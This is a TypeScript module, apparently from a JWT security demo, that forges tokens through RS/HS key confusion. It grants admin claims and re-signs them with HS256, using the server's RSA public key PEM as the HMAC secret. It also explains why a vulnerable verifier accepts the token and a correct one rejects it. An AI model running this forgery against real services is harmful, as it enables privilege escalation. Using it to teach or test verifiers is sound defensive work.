/**
 * Attack: RS/HS key confusion. The server publishes an RSA PUBLIC key to verify
 * RS256 tokens. The attacker re-signs a tampered payload with HS256, using the RSA
 * public key's PEM text as the HMAC shared secret. A verifier that (a) picks its
 * routine from the token's alg and (b) holds the public key as its only key will run
 * HMAC verification with that public key — which the attacker also did — so it passes.
 *
 * Expected: ACCEPTED by the Vulnerable verifier, REJECTED by the Correct verifier
 * (type binding: an RsaPublicKey can never enter the HMAC path).
 */

import { hmacSignWithRawSecret } from '../jwt/sign.ts';
import { utf8 } from '../jwt/base64url.ts';
import { decodeUnsafe } from './types.ts';
import type { AttackResult } from './types.ts';
import type { JwtHeader } from '../jwt/types.ts';

export async function attackKeyConfusion(
  baseToken: string,
  rsaPublicKeyPem: string,
): Promise<AttackResult> {
  const { claims } = decodeUnsafe(baseToken);
  const forgedClaims = { ...claims, admin: true, role: 'admin' };

  // Forge an HS256 header. The MAC secret is the literal PEM bytes of the PUBLIC key.
  const header: JwtHeader = { alg: 'HS256', typ: 'JWT' };
  const secretBytes = utf8(rsaPublicKeyPem);
  const forgedToken = await hmacSignWithRawSecret(secretBytes, header, forgedClaims);

  const pemPreview = rsaPublicKeyPem.replace(/\n/g, ' ').slice(0, 64) + '…';

  return {
    forgedToken,
    explanation: {
      title: 'RS/HS key confusion',
      claimedAlg: 'HS256',
      verifierMistake:
        'The verifier picks its routine from the token alg. The token says HS256, so it runs HMAC — feeding in the only key it has, the RSA public key, as if it were a shared secret.',
      whyItPassed:
        'claimed alg = HS256  →  verifier runs HMAC with key bytes = RSA public-key PEM  →  attacker MACed with the SAME public PEM  →  MACs match  →  accepted.',
      correctDefense:
        'The Correct verifier expects RS256 and holds an RsaPublicKey. HS256 is not in its allowlist, and an RsaPublicKey is type-incompatible with the HMAC path, so confusion is unrepresentable.',
      detail: [
        'The HMAC secret IS the public key — a value anyone can read:',
        pemPreview,
        'Public key bytes used as secret: same bytes the server would happily share.',
      ],
    },
  };
}
